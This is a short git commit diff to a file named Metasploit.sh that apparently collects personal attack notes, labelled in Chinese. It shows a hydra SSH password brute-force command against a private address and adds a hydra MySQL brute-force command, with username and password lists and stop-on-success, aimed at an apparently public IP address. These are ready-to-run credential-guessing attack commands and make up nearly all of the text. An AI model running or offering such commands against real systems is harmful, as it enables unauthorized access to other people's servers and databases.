24e8bbbd74393629fd8039348639a6c13d7c6377
Murviet <154199219@qq.com>
2017-06-06 15:33:51 +0800

    Update Metasploit.sh

--- Metasploit.sh
+++ Metasploit.sh
@@ -6,3 +6,6 @@
 
  hrdya 爆破ssh
     hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh
+
+ hydra 爆破mysql
+     hydra -L user.txt -P sup.txt -o savessh.log -f -vV -e ns 113.105.144.130 mysql
